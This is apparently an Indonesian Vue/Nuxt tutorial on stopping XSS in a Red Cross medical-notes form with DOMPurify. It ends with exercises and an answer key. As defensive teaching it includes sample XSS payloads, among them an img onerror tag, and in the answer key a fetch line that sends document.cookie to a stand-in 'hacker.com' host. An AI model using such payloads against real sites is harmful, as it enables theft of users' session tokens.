# Hari 72: Validasi Payload Input & Proteksi Keamanan XSS
## Melindungi Formulir Catatan Medis Dari Serangan Injeksi Script JavaScript Berbahaya (HTML Sanitization)

Selamat datang di Hari 72! Hari ini kita akan mempelajari teknik keamanan aplikasi web yang sangat vital: **HTML Sanitization & Proteksi XSS (Cross-Site Scripting)**.

Saat petugas menginput deskripsi catatan medis relawan atau alamat posko donor, mereka bisa saja tidak sengaja (atau sengaja diserang hacker) menginput teks berisi tag HTML aktif atau skrip JavaScript berbahaya, misalnya: `<script>alert('Terinfeksi!')</script>` atau `<img src="x" onerror="stealCookies()" />`. Jika kita merender teks mentah tersebut langsung di browser menggunakan arahan `v-html`, skrip tersebut akan dieksekusi oleh browser, mencuri token JWT login petugas, dan merusak web PMI.

---

## 1. Mengenal Ancaman Serangan XSS

*   **XSS (Cross-Site Scripting)**: Serangan di mana hacker berhasil menyisipkan kode JavaScript jahat ke dalam database website Anda. Ketika user lain membuka halaman tersebut, JavaScript jahat tersebut dieksekusi secara otomatis di browser korban.
*   **Perlindungan Bawaan Vue 3 (String Escaping)**: Secara default, penulisan double mustache `{{ teks }}` di Vue 3 **100% aman** dari XSS karena Vue merubah karakter khusus (seperti `<` menjadi `&lt;` dan `>` menjadi `&gt;`) sehingga teks hanya dicetak sebagai tulisan mati biasa dan tidak dieksekusi browser.
*   **Titik Lemah (v-html)**: Bahaya besar muncul jika kita sengaja menggunakan tag **`v-html="teks"`** untuk merender tulisan berformat HTML tebal/miring. Di sinilah kita wajib menyaring (*Sanitize*) teks terlebih dahulu.

---

## 2. Studi Kasus PMI: Penyaringan Input Catatan Medis Relawan

Kita akan menggunakan library standar industri **`dompurify`** (atau `isomorphic-dompurify` untuk dukungan SSR Nuxt) guna membersihkan kotoran script jahat secara instan sebelum teks dirender di layar.

### Langkah 1: Instal Dependensi
```bash
npm install isomorphic-dompurify
```

### Langkah 2: Membuat Komponen Render Catatan Medis Aman

Mari kita buat halaman pratinjau catatan riwayat medis relawan yang aman di `pages/relawan/catatan.vue`.

```html
<!-- pages/relawan/catatan.vue -->
<template>
  <div class="max-w-md mx-auto p-8 bg-white rounded-3xl border border-slate-200 mt-8 space-y-6">
    <div>
      <h3 class="font-bold text-slate-800 text-base">📝 Catatan Kondisi Medis</h3>
      <p class="text-xs text-slate-400 mt-1">Uji coba simulasi sanitasi input dari ancaman serangan XSS</p>
    </div>

    <!-- Area Form Input Teks Bebas -->
    <div class="space-y-2">
      <label class="block text-xs font-bold text-slate-500 uppercase">Input Riwayat Penyakit (Bisa Format HTML)</label>
      <textarea 
        v-model="catatanMentah" 
        rows="3"
        class="w-full px-4 py-2 border rounded-xl outline-none focus:border-red-500 text-sm font-mono"
        placeholder="Contoh: Pasien memiliki riwayat <b>Hipertensi Ringan</b>"
      ></textarea>
    </div>

    <!-- AREA RENDERING DATA -->
    <div class="space-y-4 pt-4 border-t">
      
      <!-- Skenario A: Rendering Standar (Aman Bawaan Vue - Hanya Teks Mati) -->
      <div class="p-4 bg-slate-50 rounded-xl space-y-1">
        <span class="text-[10px] font-bold text-slate-400 block uppercase">1. Render Standar ({{ teks }})</span>
        <div class="text-xs text-slate-700 leading-relaxed break-all">
          {{ catatanMentah }}
        </div>
      </div>

      <!-- Skenario B: Rendering v-html Tersanitasi DOMPurify (Aman & Indah) -->
      <div class="p-4 bg-slate-50 rounded-xl space-y-1">
        <span class="text-[10px] font-bold text-emerald-600 block uppercase">2. Render v-html + DOMPurify (Aman & Tebal)</span>
        <!-- Menggunakan DOMPurify untuk menyaring tag berbahaya -->
        <div 
          v-html="catatanAman" 
          class="text-xs text-slate-700 leading-relaxed"
        ></div>
      </div>

    </div>
  </div>
</template>

<script setup>
import { ref, computed } from 'vue';
import DOMPurify from 'isomorphic-dompurify';

definePageMeta({
  layout: 'default',
  middleware: 'auth'
});

// Teks simulasi serangan XSS bawaan
const catatanMentah = ref(
  'Pasien <b>Budi</b> memiliki riwayat darah rendah. <img src="salah" onerror="alert(\'Token Anda dicuri Hacker!\')" />'
);

// Computed bertugas membersihkan teks mentah secara reaktif menggunakan DOMPurify
const catatanAman = computed(() => {
  // DOMPurify memotong tag <script> dan atribut onerror, menyisakan tag <b> yang aman
  return DOMPurify.sanitize(catatanMentah.value);
});
</script>
```

---

## 3. Latihan Soal Mandiri
1. Amati isi teks awal `catatanMentah` di atas yang memiliki tag `<b>` dan tag `<img>` pembawa script alert jahat.
2. Coba jalankan kode di atas, jelaskan apa perbedaan visual hasil render antara Skenario A (Mustache `{{ }}`) dengan Skenario B (`v-html` + DOMPurify).
3. Sebutkan apa bahaya terbesarnya jika kita langsung menggunakan `v-html="catatanMentah"` mentah-mentah tanpa menyuplai fungsi `.sanitize()` dari DOMPurify terlebih dahulu.

---

## 4. Kunci Jawaban Soal & Penjelasan

### Jawaban 1 & 2: Analisis Perbandingan Rendering
*   **Skenario A (Mustache `{{ }}`)**: Karakter `<` dicetak utuh di layar komputer sebagai tulisan polos. Tag `<b>` tidak membuat teks menjadi tebal, melainkan hanya tertulis hurufnya saja. Begitu pula kode `<img>` dicetak sebagai teks mati yang aman.
*   **Skenario B (`v-html` + DOMPurify)**: Kata **"Budi"** berhasil dicetak dengan gaya **Tebal** (karena tag `<b>` diizinkan). Namun, tag `<img>` pembawa jebakan script `onerror` **dihapus bersih dari memori HTML** oleh DOMPurify sehingga fungsi alert bahaya tidak pernah meledak mengeksekusi script.

### Jawaban 3: Bahaya Fatal XSS Tanpa Sanitasi
*   **Pencurian Sesi Serta Merta**: Jika kita merender teks mentah menggunakan `v-html` biasa, tag `<img>` akan terpasang di browser. Karena jalur gambar `src="salah"` memicu error, browser akan langsung mengeksekusi script JavaScript di dalam atribut `onerror`.
*   Hacker bisa menyisipkan kode untuk membaca Cookies rahasia: `fetch('http://hacker.com?token=' + document.cookie)` yang secara instan mengirimkan token dinas petugas UDD PMI ke server hacker, memberikan mereka akses penuh untuk meretas logistik darah nasional secara ilegal.
